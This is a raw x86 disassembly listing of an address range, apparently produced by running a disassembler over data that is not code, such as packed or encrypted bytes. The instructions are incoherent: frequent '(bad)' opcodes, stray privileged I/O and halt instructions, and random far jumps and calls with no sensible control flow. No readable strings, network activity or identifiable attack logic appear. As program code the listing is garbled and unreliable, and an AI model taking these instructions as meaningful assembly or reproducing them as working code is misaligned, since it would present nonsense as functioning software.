  41cf7a:	dec    ecx
  41cf7b:	push   cs
  41cf7c:	push   ds
  41cf7d:	ficom  WORD PTR [ecx-0x7]
  41cf80:	lock aam 0xa
  41cf83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf84:	cmp    bl,BYTE PTR [edi-0x7056d075]
  41cf8a:	nop
  41cf8b:	out    dx,eax
  41cf8c:	lea    esi,[esp+ecx*2-0x2c]
  41cf90:	nop
  41cf91:	shl    BYTE PTR [edx+0x1e1a84e],cl
  41cf97:	aas    
  41cf98:	leave  
  41cf99:	mov    ebp,0x2a355d79
  41cf9e:	hlt    
  41cf9f:	mov    ecx,0x59e9a3ef
  41cfa4:	shl    ah,0x58
  41cfa7:	sti    
  41cfa8:	test   BYTE PTR [ecx-0x5e24442d],cl
  41cfae:	hlt    
  41cfaf:	sbb    BYTE PTR [esi+0x9],dl
  41cfb2:	fcomp  DWORD PTR [edx+eax*2]
	...
  41d015:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d01b:	push   edi
  41d01c:	sti    
  41d01d:	(bad)  
  41d01e:	das    
  41d01f:	ret    
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	daa    
  41d022:	adc    BYTE PTR [edx+eiz*2],bh
  41d025:	mov    BYTE PTR [edx+esi*1+0x1070001],dl
  41d02c:	add    BYTE PTR [eax],al
  41d02e:	es push edx
  41d030:	xchg   ebx,eax
  41d031:	arpl   WORD PTR [ecx-0x64cd249f],bp
  41d037:	push   ss
  41d038:	add    DWORD PTR [esp+edi*4],edi
  41d03b:	jae    0x41d020
  41d03d:	les    esp,FWORD PTR [edx]
  41d03f:	inc    esp
  41d040:	out    dx,eax
  41d041:	bound  eax,QWORD PTR [eax-0x1140e30]
  41d047:	lea    ebx,[eax]
  41d049:	adc    BYTE PTR [edx+0x64],al
  41d04c:	mov    bh,0xa1
  41d04e:	jne    0x41d025
  41d050:	test   eax,0x439713c8
  41d055:	xor    eax,DWORD PTR [edx]
  41d057:	jmp    0x7653c093
  41d05c:	adc    eax,0xdc5f8d02
  41d061:	call   0x49c2:0x9ac96126
  41d068:	cmp    BYTE PTR [edi],ch
  41d06a:	adc    dh,al
  41d06c:	loope  0x41cffc
  41d06e:	mov    cl,0x3e
  41d070:	lock int 0x3b
  41d073:	shr    BYTE PTR [eax-0x2c],cl
  41d076:	inc    edx
  41d077:	sbb    BYTE PTR [edx],0x58
  41d07a:	out    0x25,eax
  41d07c:	pop    ebp
  41d07d:	gs out 0xe3,al
  41d080:	adc    dl,BYTE PTR [eax-0xbaa5a1e]
  41d086:	mov    al,dh
  41d088:	fist   WORD PTR [ebp-0x6f]
  41d08b:	les    ecx,FWORD PTR [eax+ecx*2+0x6a8cfc53]
  41d092:	add    al,0xc8
  41d094:	test   bh,bh
  41d096:	out    dx,al
  41d097:	push   es
  41d098:	cmp    al,0x43
  41d09a:	out    0xd8,al
  41d09c:	int3   
  41d09d:	xor    DWORD PTR [ebp+ecx*4-0x25],edi
  41d0a1:	adc    al,0x31
  41d0a3:	mov    cl,0x83
  41d0a5:	inc    esp
  41d0a6:	jae    0x41d0f0
  41d0a8:	(bad)  
  41d0a9:	add    DWORD PTR [edx],0xffffffce
  41d0ac:	test   DWORD PTR [edi],ecx
  41d0ae:	outs   dx,BYTE PTR ds:[esi]
  41d0af:	in     al,0x17
  41d0b1:	sbb    DWORD PTR [ebp-0x5f7f72ed],0xffffffff
  41d0b8:	rcr    BYTE PTR [esi-0x4f],1
  41d0bb:	adc    al,0x93
  41d0bd:	push   cs
  41d0be:	in     eax,dx
  41d0bf:	pop    edi
  41d0c0:	lods   eax,DWORD PTR ds:[esi]
  41d0c1:	xor    bh,BYTE PTR [eax]
  41d0c3:	and    bh,0xcd
  41d0c6:	inc    ebp
  41d0c7:	cld    
  41d0c8:	dec    esi
  41d0c9:	in     eax,dx
  41d0ca:	es inc ecx
  41d0cc:	retf   
  41d0cd:	test   ch,cl
  41d0cf:	inc    edx
  41d0d0:	or     bl,BYTE PTR [eax+0x2c22a984]
  41d0d6:	ins    BYTE PTR es:[edi],dx
  41d0d7:	stc    
  41d0d8:	scas   al,BYTE PTR es:[edi]
  41d0d9:	ret    
  41d0da:	scas   al,BYTE PTR es:[edi]
  41d0db:	fcmovnu st,st(1)
  41d0dd:	nop
  41d0de:	sar    DWORD PTR [edx-0x37],cl
  41d0e1:	mov    ds:0xeb278af2,al
  41d0e6:	lods   eax,DWORD PTR ds:[esi]
  41d0e7:	mov    eax,ds:0xd6fd2b4a
  41d0ec:	lds    esp,FWORD PTR [edi]
  41d0ee:	push   edi
  41d0ef:	sahf   
  41d0f0:	repnz (bad) 
  41d0f2:	(bad)  
  41d0f3:	mov    ecx,DWORD PTR [eax]
  41d0f5:	lods   eax,DWORD PTR ds:[esi]
  41d0f6:	fisub  DWORD PTR [ebx+ebp*8]
  41d0f9:	gs inc edx
  41d0fb:	fnstsw WORD PTR fs:[ebx+0x43f47b52]
  41d102:	jmp    0xe4a:0xabf38436
  41d109:	lods   eax,DWORD PTR ds:[esi]
  41d10a:	shl    ecx,1
  41d10c:	xchg   ebx,eax
  41d10d:	xchg   edx,eax
  41d10e:	add    eax,0x43070484
  41d113:	xor    ch,BYTE PTR [ebx+0xe]
  41d116:	push   esi
  41d117:	sub    BYTE PTR [ebx],0x59
  41d11a:	cmc    
  41d11b:	sti    
  41d11c:	inc    ebp
  41d11d:	(bad)  
  41d11e:	xlat   BYTE PTR ds:[ebx]
  41d11f:	in     eax,dx
  41d120:	jge    0x41d186
  41d122:	scas   eax,DWORD PTR es:[edi]
  41d123:	rcl    BYTE PTR [ebx],cl
  41d125:	popf   
  41d126:	aas    
  41d127:	push   eax
  41d128:	and    al,0xe
  41d12a:	ret    
  41d12b:	add    DWORD PTR [edx+edi*2+0x5a],ebx
  41d12f:	pop    ss
  41d130:	sub    eax,0x5860340
	...
  41d195:	add    BYTE PTR [eax-0x3d],dl
  41d198:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d19e:	sti    
  41d19f:	aad    0x81
  41d1a1:	loopne 0x41d213
  41d1a3:	das    
  41d1a4:	fdivp  st(1),st
  41d1a6:	fwait
  41d1a7:	xor    eax,DWORD PTR [ecx]
  41d1a9:	add    BYTE PTR [edi],al
  41d1ab:	add    DWORD PTR [eax],eax
  41d1ad:	add    BYTE PTR [edx],bh
  41d1af:	mov    esp,fs
  41d1b1:	into   
  41d1b2:	rcl    bh,1
  41d1b4:	(bad)  
  41d1b5:	addr16 jmp 0x41d153
  41d1b8:	das    
  41d1b9:	add    eax,0xf01e7ae7
  41d1be:	push   0xfffffffd
  41d1c0:	push   eax
  41d1c1:	stc    
  41d1c2:	pop    ds
  41d1c3:	push   ecx
  41d1c4:	call   0xf8b7:0x276ad34c
  41d1cb:	test   al,0x68
  41d1cd:	xchg   esp,eax
  41d1ce:	push   ecx
  41d1cf:	push   es
  41d1d0:	ins    BYTE PTR es:[edi],dx
  41d1d1:	ds retf 0x38e2
  41d1d5:	out    dx,eax
  41d1d6:	push   eax
  41d1d7:	out    dx,al
  41d1d8:	push   ds
  41d1d9:	and    DWORD PTR [ebp-0x1f086558],eax
  41d1df:	mov    bh,BYTE PTR [esi+0x75ae0a4e]
  41d1e5:	or     DWORD PTR [edx+0x60],ebp
  41d1e8:	mov    ch,0x97
  41d1ea:	std    
  41d1eb:	mov    BYTE PTR [ebx+ebp*2+0x54],bl
  41d1ef:	es dec esi
  41d1f1:	xor    al,0xb2
  41d1f3:	add    edx,ebp
  41d1f5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41d1f7:	(bad)  
  41d1f8:	pop    ss
  41d1f9:	xlat   BYTE PTR ds:[ebx]
  41d1fa:	mov    ds:0xba1cbf4,al
  41d1ff:	in     eax,0x73
  41d201:	push   eax
  41d202:	sbb    ebp,DWORD PTR [ebx+0x49ef94a0]
  41d208:	push   es
  41d209:	pop    esp
  41d20a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d20b:	stos   DWORD PTR es:[edi],eax
  41d20c:	and    DWORD PTR [eax-0x11],eax
  41d20f:	retf   
  41d210:	daa    
  41d211:	adc    eax,0x4c27c403
  41d216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d217:	fs sbb dl,cl
  41d21a:	mov    ds:0x6dacba63,eax
  41d21f:	cmp    eax,0x1d664191
  41d224:	inc    edx
  41d225:	push   ds
  41d226:	pop    esp
  41d227:	pop    ss
  41d228:	popf   
  41d229:	mov    ?,WORD PTR [ecx]
  41d22b:	(bad)  
  41d22c:	dec    eax
  41d22d:	fs loopne 0x41d24b
  41d230:	(bad)  
  41d231:	retf   
  41d232:	clc    
  41d233:	ins    DWORD PTR es:[edi],dx
  41d234:	jne    0x41d273
  41d236:	nop
  41d237:	cdq    
  41d238:	adc    bh,bl
  41d23a:	shr    DWORD PTR [esi+0x1494d254],1
  41d240:	or     al,0x6c
  41d242:	xlat   BYTE PTR ds:[ebx]
  41d243:	adc    al,0xed
  41d245:	mov    ebp,DWORD PTR [ecx+edi*2+0x223e3522]
  41d24c:	pop    ss
  41d24d:	dec    ebp
  41d24e:	sub    ebx,DWORD PTR [eax]
  41d250:	icebp  
  41d251:	xor    esi,ebx
  41d253:	mov    ds:0xdc741324,al
  41d258:	and    BYTE PTR [ebp-0x3f],dl
  41d25b:	cmp    BYTE PTR [edi-0x59f8a8],0x4
  41d262:	std    
  41d263:	fimul  WORD PTR [ecx-0x7f]
  41d266:	mov    ch,0x4b
  41d268:	lods   eax,DWORD PTR ds:[esi]
  41d269:	mov    ch,0x65
  41d26b:	mov    ah,0x90
  41d26d:	sbb    esi,DWORD PTR [ebx-0x61544bf3]
  41d273:	punpckhwd mm5,mm6
  41d276:	mov    edx,edx
  41d278:	adc    ax,0x2918
  41d27c:	lods   al,BYTE PTR ds:[esi]
  41d27d:	inc    edi
  41d27e:	daa    
  41d27f:	push   eax
  41d280:	jg     0x41d2f0
  41d282:	pop    es
  41d283:	loopne 0x41d23a
  41d285:	xchg   ebx,eax
  41d286:	adc    ebp,DWORD PTR [edx+0x31]
  41d289:	mov    edi,0x3e75de33
  41d28e:	pop    ecx
  41d28f:	mov    edx,0x833c04ee
  41d294:	mov    ebp,0xc055af85
  41d299:	fs mov ch,0xcb
  41d29c:	pusha  
  41d29d:	sahf   
  41d29e:	xchg   ebp,eax
  41d29f:	imul   edi,ecx,0xcc5977a0
  41d2a5:	lods   eax,DWORD PTR ds:[esi]
  41d2a6:	push   ds
  41d2a7:	add    al,0x90
  41d2a9:	sbb    dl,BYTE PTR [ecx+0x40db2a78]
  41d2af:	xchg   esp,eax
  41d2b0:	aaa    
  41d2b1:	xor    dl,BYTE PTR [edx+0x2c]
  41d2b4:	push   ebx
	...
  41d315:	add    dh,bh
  41d317:	cmp    cl,0x54
  41d31a:	(bad)  
  41d31b:	jge    0x41d31c
  41d31d:	stos   BYTE PTR es:[edi],al
  41d31e:	sbb    BYTE PTR [ebx+0x14fd857e],ch
  41d324:	jns    0x41d2b5
  41d326:	mov    ds:0x7000134,al
  41d32b:	add    DWORD PTR [eax],eax
  41d32d:	add    BYTE PTR [ecx],bl
  41d32f:	jno    0x41d2cd
  41d331:	adc    eax,0x85b14209
  41d336:	in     al,0xc1
  41d338:	adc    al,0xcd
  41d33a:	jp     0x41d36a
  41d33c:	fs pop edx
  41d33e:	lods   eax,DWORD PTR ds:[esi]
  41d33f:	std    
  41d340:	cli    
  41d341:	enter  0x9529,0x3
  41d345:	in     eax,0x1b
  41d347:	jno    0x41d3c8
  41d349:	xchg   edx,eax
  41d34a:	aad    0xfa
  41d34c:	cwde   
  41d34d:	test   DWORD PTR [eax-0x491f7ebc],esp
  41d353:	ins    DWORD PTR es:[edi],dx
  41d354:	fist   WORD PTR [ebx]
  41d356:	into   
  41d357:	fld    TBYTE PTR [ebx+0xf]
  41d35a:	xchg   DWORD PTR [edx],esi
  41d35c:	xor    al,0xad
  41d35e:	mov    ds:0x57fe414e,al
  41d363:	inc    ebp
  41d364:	adc    DWORD PTR [edi+0x4437c07],0x8
  41d36b:	mov    ebx,0x6fa875ef
  41d370:	popa   
  41d371:	xor    edi,ebp
  41d373:	(bad)  
  41d374:	int3   
  41d375:	pop    esp
  41d376:	rcr    BYTE PTR [eax-0x4a50e8af],0x72
  41d37d:	xchg   ecx,eax
  41d37e:	iret   
  41d37f:	mov    eax,ds:0x49f72559
  41d384:	sbb    cl,BYTE PTR [ebp-0x4026de3c]
  41d38a:	mov    dh,0xfe
  41d38c:	xchg   BYTE PTR [ebx+0x5c],bl
  41d38f:	jae    0x41d360
  41d391:	lock push ds
  41d393:	mov    DWORD PTR [ebx+0x45],eax
  41d396:	mov    ebp,DWORD PTR [ebx-0x646647f7]
  41d39c:	inc    eax
  41d39d:	shr    DWORD PTR [ebx+0x2e08b4a7],cl
  41d3a3:	mov    edx,0xa7244873
  41d3a8:	inc    edx
  41d3a9:	js     0x41d35f
  41d3ab:	jecxz  0x41d368
  41d3ad:	dec    esp
  41d3ae:	inc    eax
  41d3af:	loopne 0x41d362
  41d3b1:	iret   
  41d3b2:	xor    eax,0xde18c5f6
  41d3b7:	test   al,0x63
  41d3b9:	dec    ebp
  41d3ba:	sahf   
  41d3bb:	mov    eax,ds:0xdc4de398
  41d3c0:	ss out 0x37,eax
  41d3c3:	sbb    eax,0x818e050f
  41d3c8:	cs stc 
  41d3ca:	cmp    ecx,ebx
  41d3cc:	and    esi,ecx
  41d3ce:	pop    ebp
  41d3cf:	retf   
  41d3d0:	sub    DWORD PTR [ebp-0x6c4bcb1a],ebx
  41d3d6:	xor    eax,0x30a4158f
  41d3db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3dc:	pop    ebp
  41d3dd:	into   
  41d3de:	add    ebx,0x1
  41d3e1:	shl    BYTE PTR [ebx-0x77],cl
  41d3e4:	sbb    ebx,DWORD PTR [eax-0x5729d810]
  41d3ea:	sub    eax,0x75e0252
  41d3ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3f0:	outs   dx,BYTE PTR ds:[esi]
  41d3f1:	aaa    
  41d3f2:	xchg   ebx,eax
  41d3f3:	adc    edx,edx
  41d3f5:	add    cl,BYTE PTR [eax]
  41d3f7:	cmp    ah,dh
  41d3f9:	ins    DWORD PTR es:[edi],dx
  41d3fa:	stos   BYTE PTR es:[edi],al
  41d3fb:	xchg   DWORD PTR [ebx],ebp
  41d3fd:	sub    dh,BYTE PTR [eax+edi*8+0x4a]
  41d401:	ror    BYTE PTR [ecx+0x5e],0xe8
  41d405:	sbb    al,0xf9
  41d407:	sbb    al,0x66
  41d409:	(bad)  
  41d40a:	fsub   QWORD PTR [esi]
  41d40c:	and    ch,BYTE PTR [ebx]
  41d40e:	xchg   BYTE PTR [edx+edi*4-0x38],bh
  41d412:	mov    ah,0xd8
  41d414:	(bad)  
  41d415:	pop    esi
  41d416:	inc    esi
  41d417:	cmp    al,0xac
  41d419:	mov    cl,0x40
  41d41b:	pop    ebp
  41d41c:	inc    ecx
  41d41d:	dec    esi
  41d41e:	and    cl,BYTE PTR [edi]
  41d420:	int    0xff
  41d422:	dec    edi
  41d423:	mov    eax,es
  41d425:	gs inc edi
  41d427:	mov    bh,0xac
  41d429:	repz mov ebx,cs
  41d42c:	ins    DWORD PTR es:[edi],dx
  41d42d:	pop    ebp
  41d42e:	(bad)  
  41d42f:	pop    edx
  41d430:	jno    0x41d49d
  41d432:	adc    al,0xb3
  41d434:	popf   
	...
  41d495:	add    dh,dh
  41d497:	rcl    BYTE PTR ss:[edx+edx*8-0x2e89090c],cl
  41d49f:	fwait
  41d4a0:	aad    0xa2
  41d4a2:	mov    dh,0x8f
  41d4a4:	stos   BYTE PTR es:[edi],al
  41d4a5:	hlt    
  41d4a6:	test   eax,0x7000135
  41d4ab:	add    DWORD PTR [eax],eax
  41d4ad:	add    BYTE PTR [esi+0x29],cl
  41d4b0:	lods   eax,DWORD PTR ds:[esi]
  41d4b1:	enter  0x2c86,0x6
  41d4b5:	shl    BYTE PTR [edi+0x42a9f786],cl
  41d4bb:	in     al,0x91
  41d4bd:	fwait
  41d4be:	(bad)  
  41d4bf:	push   ebp
  41d4c0:	sub    al,0xe0
  41d4c2:	js     0x41d4f3
  41d4c4:	cwde   
  41d4c5:	sub    al,0x94
  41d4c7:	(bad)  
  41d4c8:	jns    0x41d50d
  41d4ca:	push   edx
  41d4cb:	int    0x79
  41d4cd:	outs   dx,BYTE PTR ds:[esi]
  41d4ce:	pop    esi
  41d4cf:	or     BYTE PTR [esi],dl
  41d4d1:	push   ss
  41d4d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4d3:	inc    ebx
  41d4d4:	imul   edi,DWORD PTR [eax+eax*4],0xffffff98
  41d4d8:	lea    ecx,[ecx+0x21]
  41d4db:	ret    
  41d4dc:	dec    edi
  41d4dd:	mov    edi,0x3bac24b6
  41d4e2:	sar    edx,1
  41d4e4:	jp     0x41d472
  41d4e6:	push   ss
  41d4e7:	xchg   edi,eax
  41d4e8:	fnsave [ecx-0x3f513554]
  41d4ee:	mov    ds,edi
  41d4f0:	xor    eax,0xc1cbc22e
  41d4f5:	mov    WORD PTR [ecx+ecx*8],ss
  41d4f8:	or     bl,bh
  41d4fa:	arpl   WORD PTR ds:0xf012c1f4,dx
  41d500:	jo     0x41d570
  41d502:	lods   eax,DWORD PTR ds:[esi]
  41d503:	cmp    ebx,ebp
  41d505:	jns    0x41d51f
  41d507:	ret    0xa663
  41d50a:	pop    ebp
  41d50b:	jno    0x41d4d8
  41d50d:	(bad)  
  41d50e:	fmul   st,st(2)
  41d510:	sbb    DWORD PTR [edi],edx
  41d512:	jmp    0x58814dca
  41d517:	sbb    ch,al
  41d519:	pop    edx
  41d51a:	in     al,dx
  41d51b:	xchg   esp,eax
  41d51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d51d:	(bad)  
  41d51e:	mov    ebx,0x3250ef9e
  41d523:	icebp  
  41d524:	mov    edi,0xe232e6b0
  41d529:	pop    DWORD PTR [eax]
  41d52b:	imul   edx,esp,0x1199fcf1
  41d531:	xchg   DWORD PTR [esi],ecx
  41d533:	ss xchg esp,eax
  41d535:	test   esp,0x2e81c19a
  41d53b:	push   eax
  41d53c:	push   edi
  41d53d:	dec    edi
  41d53e:	(bad)  
  41d53f:	retf   0xb3de
  41d542:	adc    DWORD PTR [ecx-0xdf3bc27],edx
  41d548:	(bad)  [eax+eax*8]
  41d54b:	sbb    ebx,DWORD PTR [edi]
  41d54d:	add    bl,dh
  41d54f:	pop    ecx
  41d550:	enter  0xd666,0xbd
  41d554:	mov    edx,0x55aa6187
  41d559:	pop    ds
  41d55a:	jbe    0x41d51d
  41d55c:	or     ch,ch
  41d55e:	mov    dl,0xaa
  41d560:	gs jo  0x41d5c9
  41d563:	daa    
  41d564:	dec    eax
  41d565:	test   al,0x4a
  41d567:	bound  edi,QWORD PTR [eax+0x4fea4aaa]
  41d56d:	mov    esp,0xdb9c804c
  41d572:	(bad)  
  41d573:	aam    0x73
  41d575:	bnd jb 0x41d5b0
  41d578:	push   es
  41d579:	lea    ebx,[ebx+0x3f3f8444]
  41d57f:	pushf  
  41d580:	pop    esp
  41d581:	add    al,ch
  41d583:	sbb    DWORD PTR [eax+0x61dccae2],0x7
  41d58a:	push   ecx
  41d58b:	dec    eax
  41d58c:	fnstcw WORD PTR ds:0xfbacdf34
  41d592:	adc    al,ch
  41d594:	shl    DWORD PTR [edi+0x2fb9338b],1
  41d59a:	jo     0x41d542
  41d59c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d59d:	sar    BYTE PTR [ecx-0x29251db1],1
  41d5a3:	or     eax,0x5d7975ba
  41d5a8:	test   eax,0x479bd50
  41d5ad:	xor    eax,0xb3f35232
  41d5b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b3:	lock sub eax,DWORD PTR [eax]
	...
  41d616:	jl     0x41d5b1
  41d618:	dec    esp
  41d619:	jbe    0x41d608
  41d61b:	idiv   DWORD PTR [esi-0x65]
  41d61e:	mov    al,BYTE PTR [edi-0xd112ddf]
  41d624:	ja     0x41d5e8
  41d626:	mov    al,0x36
  41d628:	add    DWORD PTR [eax],eax
  41d62a:	pop    es
  41d62b:	add    DWORD PTR [eax],eax
  41d62d:	add    BYTE PTR [edi+0x30],ah
  41d630:	pop    esp
  41d631:	scas   al,BYTE PTR es:[edi]
  41d632:	xchg   ebx,eax
  41d633:	test   BYTE PTR [edx+eax*8+0x1e22e9d2],0xae
  41d63b:	call   0x9069:0x3039
  41d641:	dec    ebp
  41d642:	js     0x41d68d
  41d644:	jle    0x41d669
  41d646:	xchg   esp,eax
  41d647:	jmp    0x42f7e682
  41d64c:	retf   0x87fc
  41d64f:	lods   al,BYTE PTR ds:[esi]
  41d650:	push   eax
  41d651:	pop    ss
  41d652:	dec    edx
  41d653:	sbb    al,0x53
  41d655:	popf   
  41d656:	adc    DWORD PTR [eax-0x29383e19],esi
  41d65c:	jmp    0x41d62a
  41d65e:	or     ebp,DWORD PTR [ebx-0x43]
  41d661:	data16 je 0x41d69a
  41d664:	push   esp
  41d665:	sar    BYTE PTR [ebx-0x2b],1
  41d668:	test   BYTE PTR [edx+ecx*4-0xc],bh
  41d66c:	or     ebx,edx
  41d66e:	sbb    DWORD PTR [ecx-0x46],0x72
  41d672:	sahf   
  41d673:	popa   
  41d674:	shl    DWORD PTR ds:[esi+0xe],0xb7
  41d679:	sbb    ebp,DWORD PTR [ecx]
  41d67b:	pushf  
  41d67c:	push   cs
  41d67d:	popf   
  41d67e:	lock popa 
  41d680:	xor    eax,0x818639a1
  41d685:	and    ch,0xa8
  41d688:	stc    
  41d689:	push   0x5e
  41d68b:	(bad)  
  41d68c:	and    ah,BYTE PTR [ebp-0x21b415e0]
  41d692:	pusha  
  41d693:	pushf  
  41d694:	stc    
  41d695:	ror    BYTE PTR [edx-0x4],1
  41d698:	dec    ebx
  41d699:	imul   edx,DWORD PTR [ebx+ebx*4-0x570318aa],0x414141e9
  41d6a4:	add    DWORD PTR [edx],esp
  41d6a6:	push   0xbc8ebcbe
  41d6ab:	or     edx,esi
  41d6ad:	(bad)  
  41d6ae:	jbe    0x41d700
  41d6b0:	enter  0x5389,0xf6
  41d6b4:	sbb    bh,BYTE PTR ds:0x4353b805
  41d6ba:	inc    esp
  41d6bb:	div    BYTE PTR [edx+eiz*1-0x386fc4e2]
  41d6c2:	mov    ds:0x2992952c,al
  41d6c7:	stos   BYTE PTR es:[edi],al
  41d6c8:	test   eax,0xfd5d7e82
  41d6cd:	push   edx
  41d6ce:	int    0x44
  41d6d0:	push   esp
  41d6d1:	fld    DWORD PTR [esi+ecx*8]
  41d6d4:	sbb    al,BYTE PTR [esi-0x33]
  41d6d7:	push   ecx
  41d6d8:	sub    al,0x5f
  41d6da:	inc    eax
  41d6db:	adc    ch,BYTE PTR [edx-0x1d7f5a14]
  41d6e1:	arpl   WORD PTR [edx],bp
  41d6e3:	jmp    0x41d673
  41d6e5:	jle    0x41d6d6
  41d6e7:	xchg   esp,eax
  41d6e8:	mov    esp,0x695e3b4e
  41d6ed:	enter  0x43a5,0x13
  41d6f1:	lahf   
  41d6f2:	dec    esi
  41d6f3:	push   es
  41d6f4:	loop   0x41d6cf
  41d6f6:	sbb    bl,dl
  41d6f8:	gs add ah,dh
  41d6fb:	fwait
  41d6fc:	jns    0x41d6ad
  41d6fe:	pop    edx
  41d6ff:	nop
  41d700:	mov    cl,0x26
  41d702:	and    DWORD PTR [ebp-0x58],esp
  41d705:	into   
  41d706:	xchg   ebp,eax
  41d707:	dec    ebp
  41d708:	fcomi  st,st(1)
  41d70a:	pop    ebx
  41d70b:	stos   BYTE PTR es:[edi],al
  41d70c:	xchg   edx,eax
  41d70d:	call   0x7231de87
  41d712:	loope  0x41d6a5
  41d714:	push   eax
  41d715:	jno    0x41d6ab
  41d717:	in     al,dx
  41d718:	popf   
  41d719:	pop    ecx
  41d71a:	ins    BYTE PTR es:[edi],dx
  41d71b:	ins    DWORD PTR es:[edi],dx
  41d71c:	ficom  DWORD PTR [ebx-0x64f68078]
  41d722:	or     BYTE PTR [ecx+0x6],ah
  41d725:	dec    ecx
  41d726:	xchg   esi,eax
  41d727:	dec    ecx
  41d728:	ss cwde 
  41d72a:	or     al,0x53
  41d72c:	xor    eax,0x7be15728
  41d731:	cmp    bl,ah
  41d733:	mov    ecx,0xfd
	...
  41d794:	add    BYTE PTR [eax],al
  41d796:	and    al,0xce
  41d798:	outs   dx,BYTE PTR ds:[esi]
  41d799:	sub    ch,dh
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	fs into 
  41d79e:	push   ecx
  41d79f:	pop    ebp
  41d7a0:	or     esp,edi
  41d7a2:	xchg   ebp,eax
  41d7a3:	ror    BYTE PTR [esi+edi*1-0x49],1
  41d7a7:	aaa    
  41d7a8:	add    DWORD PTR [eax],eax
  41d7aa:	pop    es
  41d7ab:	add    DWORD PTR [eax],eax
  41d7ad:	add    BYTE PTR [ebp-0x50],bh
  41d7b0:	ror    BYTE PTR [ecx+0x39309b4],0x9d
  41d7b7:	aas    
  41d7b8:	xor    cl,BYTE PTR [eax+0x6fe7ab6]
  41d7be:	daa    
  41d7bf:	test   BYTE PTR [ecx],bl
  41d7c1:	jns    0x41d840
  41d7c3:	out    0x7f,al
  41d7c5:	jle    0x41d7b4
  41d7c7:	fmul   st,st(5)
  41d7c9:	sub    cl,dl
  41d7cb:	popf   
  41d7cc:	mov    esi,0x65a14c24
  41d7d1:	cs sbb esp,0x53
  41d7d5:	mov    ebp,0xda358a74
  41d7da:	cld    
  41d7db:	dec    eax
  41d7dc:	in     al,dx
  41d7dd:	push   esp
  41d7de:	cmp    BYTE PTR [edx+eiz*2],bl
  41d7e1:	jno    0x41d824
  41d7e3:	jmp    0xc3564356
  41d7e8:	mov    ebp,0x4934ee3a
  41d7ed:	addr16 aam 0x6
  41d7f0:	sar    edi,cl
  41d7f2:	lea    ecx,[esi+0x50]
  41d7f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7f6:	js     0x41d791
  41d7f8:	inc    eax
  41d7f9:	jmp    0xc09f:0x554bce54
  41d800:	jae    0x41d84a
  41d802:	push   eax
  41d803:	adc    BYTE PTR [esi+0x2c],dl
  41d806:	pop    ss
  41d807:	mov    ds:0xe4829689,eax
  41d80c:	lahf   
  41d80d:	push   0xffffffc1
  41d80f:	adc    eax,0x7d65ff7f
  41d814:	in     eax,dx
  41d815:	or     dh,dh
  41d817:	add    eax,0xe9fbb2d7
  41d81c:	ret    0x5ec1
  41d81f:	inc    ebp
  41d820:	repnz lods eax,DWORD PTR ds:[esi]
  41d822:	mov    bh,0x9b
  41d824:	mov    esp,0x28092a48
  41d829:	sar    DWORD PTR ds:[edi+ecx*1-0x5aa67d4c],1
  41d831:	xor    ah,BYTE PTR [esi-0x64]
  41d834:	adc    ebx,DWORD PTR [edx]
  41d836:	adc    BYTE PTR [esi],al
  41d838:	scas   eax,DWORD PTR es:[edi]
  41d839:	fld    QWORD PTR [ebp-0x482e7299]
  41d83f:	mul    BYTE PTR [ecx-0x7c99a865]
  41d845:	dec    eax
  41d846:	pop    esi
  41d847:	adc    eax,0x29f9c3e2
  41d84c:	addr16 mov bl,0x4d
  41d84f:	xor    eax,0x6866aa44
  41d854:	add    bh,ch
  41d856:	bound  eax,QWORD PTR [ebx]
  41d858:	mov    eax,ds:0x4e55fd5b
  41d85d:	ds aad 0xf8
  41d860:	or     BYTE PTR [ecx+0x7edb9a14],ah
  41d866:	pusha  
  41d867:	add    al,0x2d
  41d869:	mov    ebp,DWORD PTR ds:0x69dddf0d
  41d86f:	les    edi,FWORD PTR [ebx]
  41d871:	adc    BYTE PTR [eax],0x9d
  41d874:	xor    BYTE PTR [eax],bh
  41d876:	(bad)  
  41d877:	fsub   st,st(2)
  41d879:	push   esi
  41d87a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d87b:	(bad)  
  41d87c:	stos   DWORD PTR es:[edi],eax
  41d87d:	outs   dx,BYTE PTR ds:[esi]
  41d87e:	out    0xd2,al
  41d880:	add    al,0x55
  41d882:	arpl   dx,sp
  41d884:	sbb    eax,0x3ccad3c1
  41d889:	dec    esp
  41d88a:	aam    0x1b
  41d88c:	push   edi
  41d88d:	fdivr  QWORD PTR [ebx-0x347803f7]
  41d893:	sbb    ch,BYTE PTR [eax-0x19]
  41d896:	add    al,0x3d
  41d898:	cmp    al,dl
  41d89a:	xchg   esi,eax
  41d89b:	es scas al,BYTE PTR es:[edi]
  41d89d:	mov    al,ds:0xa97f62da
  41d8a2:	jecxz  0x41d840
  41d8a4:	sub    al,0x0
  41d8a6:	sbb    ch,dl
  41d8a8:	leave  
  41d8a9:	push   0xffffff90
  41d8ab:	sub    eax,0x6905c490
  41d8b0:	outs   dx,DWORD PTR ds:[esi]
  41d8b1:	sub    al,0x9
  41d8b3:	imul   ebp,DWORD PTR [edi+0x0],0x0
	...
  41d916:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	(bad)  
  41d91c:	fistp  QWORD PTR [ebx+eiz*8+0x0]
  41d920:	inc    eax
  41d921:	jmp    0x38be:0xd74ae1e4
  41d928:	add    DWORD PTR [eax],eax
  41d92a:	pop    es
  41d92b:	add    DWORD PTR [eax],eax
  41d92d:	add    ch,bh
  41d92f:	fsubr  DWORD PTR [edx]
  41d931:	lods   eax,DWORD PTR ds:[esi]
  41d932:	mov    bh,0x50
  41d934:	inc    ecx
